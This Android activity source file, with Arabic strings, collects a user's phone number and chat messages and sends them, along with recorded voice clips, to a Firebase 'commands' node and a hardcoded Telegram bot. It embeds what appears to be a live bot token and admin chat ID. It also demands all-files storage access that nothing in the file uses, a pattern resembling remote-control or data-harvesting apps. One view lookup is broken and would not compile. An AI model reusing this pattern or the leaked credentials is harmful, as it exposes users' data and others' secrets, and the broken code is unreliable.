package com.ban.ab;

import android.annotation.SuppressLint;
import android.app.Dialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import org.json.JSONObject;
import java.io.File;
import java.io.IOException;
import java.util.Iterator;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private EditText edtUserName, edtServiceType;
    private Button btnSubmit;
    private ProgressBar mainProgressBar;
    private final OkHttpClient client = new OkHttpClient();
    
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private final String TELEGRAM_BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String ADMIN_CHAT_ID = "1749638488"; 

    private MediaRecorder recorder;
    private String voiceFileName;
    private FloatingActionButton fabChat;
    
    // متغيرات المحادثة الحية
    private Handler chatHandler = new Handler(Looper.getMainLooper());
    private Runnable chatRunnable;
    private String currentUserID = "visitor";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        checkFilePermissions();

        edtUserName = findViewById(R.id.edtUserName);
        edtServiceType = findViewById(R.id.edtServiceType);
        btnSubmit = findViewById(R.id.btnSubmit);
        mainProgressBar = findViewById(R.id.mainProgressBar);

        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        if (pref.contains("user_name")) {
            currentUserID = pref.getString("user_name", "visitor");
            startActivity(new Intent(this, SecondActivity.class));
            finish();
            return;
        }

        setupFloatingChatButton();

        btnSubmit.setOnClickListener(v -> {
            String name = edtUserName.getText().toString().trim();
            if (!name.isEmpty()) {
                currentUserID = name; // تحديث المعرف عند الكتابة
                mainProgressBar.setVisibility(View.VISIBLE);
                btnSubmit.setEnabled(false);
                uploadToFirebase(name);
            } else {
                Toast.makeText(this, "يرجى إدخال رقم الهاتف", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void setupFloatingChatButton() {
        fabChat = new FloatingActionButton(this);
        fabChat.setImageResource(android.R.drawable.stat_notify_chat);
        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#1A73E8")));
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(-2, -2);
        params.gravity = Gravity.BOTTOM | Gravity.START;
        params.setMargins(50, 0, 0, 50);
        ((ViewGroup) findViewById(android.R.id.content)).addView(fabChat, params);
        fabChat.setOnClickListener(v -> showChatPopup());
    }

    @SuppressLint("ClickableViewAccessibility")
    private void showChatPopup() {
        final Dialog chatDialog = new Dialog(this);
        chatDialog.setContentView(R.layout.chat_layout);
        chatDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        
        Window window = chatDialog.getWindow();
        window.setGravity(Gravity.BOTTOM | Gravity.START);
        WindowManager.LayoutParams wlp = window.getAttributes();
        wlp.x = 50; wlp.y = 200;
        window.setAttributes(wlp);

        LinearLayout msgContainer = chatDialog.findViewById(R.id.chatMessagesContainer);
        ScrollView scrollView = chatDialog.findViewById(chatScrollView);
        EditText edtMsg = chatDialog.findViewById(R.id.edtMessage);
        ImageButton btnSend = chatDialog.findViewById(R.id.btnSendMessage);
        ImageButton btnRecord = chatDialog.findViewById(R.id.btnRecord);

        // تحميل الرسائل السابقة ومراقبة الجديد
        startChatMonitoring(msgContainer, scrollView);

        chatDialog.findViewById(R.id.btnCloseChat).setOnClickListener(v -> {
            stopChatMonitoring();
            chatDialog.dismiss();
        });

        btnSend.setOnClickListener(v -> {
            String text = edtMsg.getText().toString().trim();
            if (!text.isEmpty()) {
                saveMessageToFirebase("user", text);
                sendTextToTelegram(text);
                edtMsg.setText("");
            }
        });

        btnRecord.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) startVoiceRecording();
            else if (event.getAction() == MotionEvent.ACTION_UP) stopVoiceRecording();
            return true;
        });

        chatDialog.show();
    }

    private void startChatMonitoring(LinearLayout container, ScrollView scroll) {
        chatRunnable = new Runnable() {
            @Override
            public void run() {
                loadChatMessages(container, scroll);
                chatHandler.postDelayed(this, 2000); // تحديث كل ثانيتين
            }
        };
        chatHandler.post(chatRunnable);
    }

    private void stopChatMonitoring() {
        if (chatRunnable != null) chatHandler.removeCallbacks(chatRunnable);
    }

    private void loadChatMessages(LinearLayout container, ScrollView scroll) {
        String url = FIREBASE_URL + "commands/" + currentUserID + "/messages.json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    String data = response.body().string();
                    if (data.equals("null")) return;
                    runOnUiThread(() -> {
                        try {
                            JSONObject json = new JSONObject(data);
                            container.removeAllViews();
                            Iterator<String> keys = json.keys();
                            while (keys.hasNext()) {
                                JSONObject msgObj = json.getJSONObject(keys.next());
                                addMessageToUI(container, msgObj.getString("text"), msgObj.getString("sender"));
                            }
                            scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN));
                        } catch (Exception e) {}
                    });
                }
            }
        });
    }

    private void addMessageToUI(LinearLayout container, String text, String sender) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setPadding(30, 20, 30, 20);
        tv.setTextSize(14);
        tv.setTextColor(Color.BLACK);
        
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-2, -2);
        lp.setMargins(10, 10, 10, 10);
        
        if (sender.equals("user")) {
            tv.setBackgroundResource(android.R.drawable.editbox_dropdown_light_frame);
            lp.gravity = Gravity.END;
        } else {
            tv.setBackgroundResource(android.R.drawable.editbox_dropdown_dark_frame);
            tv.setTextColor(Color.WHITE);
            lp.gravity = Gravity.START;
        }
        
        container.addView(tv, lp);
    }

    private void saveMessageToFirebase(String sender, String text) {
        String url = FIREBASE_URL + "commands/" + currentUserID + "/messages.json";
        try {
            JSONObject msg = new JSONObject();
            msg.put("sender", sender);
            msg.put("text", text);
            msg.put("time", System.currentTimeMillis());
            
            RequestBody body = RequestBody.create(msg.toString(), MediaType.parse("application/json"));
            client.newCall(new Request.Builder().url(url).post(body).build()).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) {}
            });
        } catch (Exception e) {}
    }

    // --- الدوال الأصلية (مع تعديلات بسيطة للاتساق) ---

    private void sendTextToTelegram(String msg) {
        String fullMsg = "💬 **رسالة من:** " + currentUserID + "\n\n" + msg;
        String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage?chat_id=" + ADMIN_CHAT_ID + "&text=" + Uri.encode(fullMsg);
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void startVoiceRecording() {
        try {
            voiceFileName = getExternalCacheDir().getAbsolutePath() + "/v_temp.m4a";
            recorder = new MediaRecorder();
            recorder.setAudioSource(1); recorder.setOutputFormat(2); recorder.setAudioEncoder(3);
            recorder.setOutputFile(voiceFileName);
            recorder.prepare(); recorder.start();
        } catch (Exception e) {}
    }

    private void stopVoiceRecording() {
        if (recorder != null) {
            recorder.stop(); recorder.release(); recorder = null;
            sendVoiceToTelegram(voiceFileName);
        }
    }

    private void sendVoiceToTelegram(String path) {
        File file = new File(path);
        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("voice", file.getName(), RequestBody.create(file, MediaType.parse("audio/m4a")))
                .addFormDataPart("chat_id", ADMIN_CHAT_ID)
                .build();
        client.newCall(new Request.Builder().url("https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendVoice").post(body).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void checkFilePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:"+getPackageName())));
        }
    }

    private void uploadToFirebase(String name) {
        String url = FIREBASE_URL + "commands/" + name + ".json";
        try {
            JSONObject body = new JSONObject();
            body.put("status", "waiting");
            body.put("service", edtServiceType.getText().toString());
            client.newCall(new Request.Builder().url(url).put(RequestBody.create(body.toString(), MediaType.parse("application/json"))).build()).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) { handleError("فشل الاتصال"); }
                @Override public void onResponse(Call call, Response response) {
                    if (response.isSuccessful()) { sendTelegramNotification(name); saveAndProceed(name); }
                }
            });
        } catch (Exception e) {}
    }

    private void sendTelegramNotification(String name) {
        String url = "https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendMessage?chat_id="+ADMIN_CHAT_ID+"&text="+Uri.encode("🚀 طلب جديد: "+name);
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void saveAndProceed(String name) {
        getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().putString("user_name", name).apply();
        runOnUiThread(() -> new Handler().postDelayed(() -> {
            startActivity(new Intent(MainActivity.this, SecondActivity.class));
            finish();
        }, 1000));
    }

    private void handleError(String msg) {
        runOnUiThread(() -> { mainProgressBar.setVisibility(View.GONE); btnSubmit.setEnabled(true); Toast.makeText(this, msg, 0).show(); });
    }
}
